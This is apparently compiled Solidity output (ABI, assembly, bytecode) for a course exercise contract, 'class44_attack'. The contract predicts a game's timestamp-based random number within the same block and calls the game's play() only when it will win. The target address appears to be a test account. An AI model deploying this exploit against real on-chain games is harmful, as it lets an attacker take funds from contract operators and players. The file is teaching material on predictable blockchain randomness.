{
	"44_attack.sol": {
		"class44_attack": {
			"abi": [
				{
					"constant": true,
					"inputs": [],
					"name": "get_randon",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "game",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"payable": true,
					"stateMutability": "payable",
					"type": "fallback"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"44_attack.sol\":561:1080  contract class44_attack{... */\n  mstore(0x40, 0x80)\n    /* \"44_attack.sol\":613:655  0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n  0x5b38da6a701c568545dcfcb03fcb875f56beddc4\n    /* \"44_attack.sol\":591:655  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n  0x0\n  dup1\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"44_attack.sol\":703:707  game */\n  0x0\n  dup1\n  swap1\n  sload\n  swap1\n  0x100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"44_attack.sol\":662:708  class44_game gamecontract = class44_game(game) */\n  0x1\n  exp(0x100, 0x0)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"44_attack.sol\":561:1080  contract class44_attack{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"44_attack.sol\":561:1080  contract class44_attack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x8b5a2d54\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xc3fe3e28\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      stop\n        /* \"44_attack.sol\":715:864  function get_randon() public view returns(uint){... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_7:\n        /* \"44_attack.sol\":715:864  function get_randon() public view returns(uint){... */\n      pop\n      tag_8\n      jump(tag_9)\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":870:984  function attack() public payable {... */\n    tag_3:\n      tag_10\n      jump(tag_11)\n    tag_10:\n      stop\n        /* \"44_attack.sol\":591:655  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"44_attack.sol\":591:655  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n      pop\n      tag_13\n      jump(tag_14)\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":715:864  function get_randon() public view returns(uint){... */\n    tag_9:\n        /* \"44_attack.sol\":757:761  uint */\n      0x0\n        /* \"44_attack.sol\":772:786  bytes32 ramdon */\n      dup1\n        /* \"44_attack.sol\":816:819  now */\n      timestamp\n        /* \"44_attack.sol\":799:820  abi.encodePacked(now) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"44_attack.sol\":799:820  abi.encodePacked(now) */\n      swap1\n      0x40\n      mstore\n        /* \"44_attack.sol\":789:821  keccak256(abi.encodePacked(now)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_16:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":51:70   */\n      iszero\n        /* \"--CODEGEN--\":36:189   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_16)\n    tag_17:\n        /* \"--CODEGEN--\":274:275   */\n      0x1\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":789:821  keccak256(abi.encodePacked(now)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"44_attack.sol\":772:821  bytes32 ramdon = keccak256(abi.encodePacked(now)) */\n      swap1\n      pop\n        /* \"44_attack.sol\":853:857  1000 */\n      0x3e8\n        /* \"44_attack.sol\":843:849  ramdon */\n      dup2\n        /* \"44_attack.sol\":838:850  uint(ramdon) */\n      0x1\n      swap1\n      div\n        /* \"44_attack.sol\":838:857  uint(ramdon) % 1000 */\n      dup2\n      iszero\n      iszero\n      tag_19\n      jumpi\n      invalid\n    tag_19:\n      mod\n        /* \"44_attack.sol\":831:857  return uint(ramdon) % 1000 */\n      swap2\n      pop\n        /* \"44_attack.sol\":715:864  function get_randon() public view returns(uint){... */\n      pop\n      swap1\n      jump\t// out\n        /* \"44_attack.sol\":870:984  function attack() public payable {... */\n    tag_11:\n        /* \"44_attack.sol\":935:938  500 */\n      0x1f4\n        /* \"44_attack.sol\":921:933  get_randon() */\n      tag_21\n        /* \"44_attack.sol\":921:931  get_randon */\n      tag_9\n        /* \"44_attack.sol\":921:933  get_randon() */\n      jump\t// in\n    tag_21:\n        /* \"44_attack.sol\":921:938  get_randon()>=500 */\n      lt\n      iszero\n        /* \"44_attack.sol\":913:939  require(get_randon()>=500) */\n      iszero\n      iszero\n      tag_22\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_22:\n        /* \"44_attack.sol\":949:961  gamecontract */\n      0x1\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"44_attack.sol\":949:966  gamecontract.play */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x93e84cd9\n        /* \"44_attack.sol\":949:968  gamecontract.play() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_23:\n        /* \"44_attack.sol\":949:968  gamecontract.play() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"44_attack.sol\":949:968  gamecontract.play() */\n      pop\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":870:984  function attack() public payable {... */\n      jump\t// out\n        /* \"44_attack.sol\":591:655  address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n    tag_14:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820485ac4351cac1270c4703fcd98e76b4019c557ed36f87964bf33e5d99e8a531c0029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052735b38da6a701c568545dcfcb03fcb875f56beddc46000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061028d806100c96000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638b5a2d54146100595780639e5faafc14610084578063c3fe3e281461008e575b005b34801561006557600080fd5b5061006e6100e5565b6040518082815260200191505060405180910390f35b61008c610184565b005b34801561009a57600080fd5b506100a361023c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561013d5780518252602082019150602081019050602083039250610118565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561017d57fe5b0691505090565b6101f461018f6100e5565b1015151561019c57600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166393e84cd96040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561022257600080fd5b505af1158015610236573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820485ac4351cac1270c4703fcd98e76b4019c557ed36f87964bf33e5d99e8a531c0029",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x5B38DA6A701C568545DCFCB03FCB875F56BEDDC4 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x28D DUP1 PUSH2 0xC9 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x8B5A2D54 EQ PUSH2 0x59 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xC3FE3E28 EQ PUSH2 0x8E JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6E PUSH2 0xE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8C PUSH2 0x184 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA3 PUSH2 0x23C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x13D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x118 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x17D JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH2 0x1F4 PUSH2 0x18F PUSH2 0xE5 JUMP JUMPDEST LT ISZERO ISZERO ISZERO PUSH2 0x19C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x93E84CD9 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x222 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x236 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0x48 GAS 0xc4 CALLDATALOAD SHR 0xac SLT PUSH17 0xC4703FCD98E76B4019C557ED36F87964BF CALLER 0xe5 0xd9 SWAP15 DUP11 MSTORE8 SHR STOP 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "130600",
						"executionCost": "40923",
						"totalCost": "171523"
					},
					"external": {
						"": "129",
						"attack()": "infinite",
						"game()": "486",
						"get_randon()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"game()": "c3fe3e28",
					"get_randon()": "8b5a2d54"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}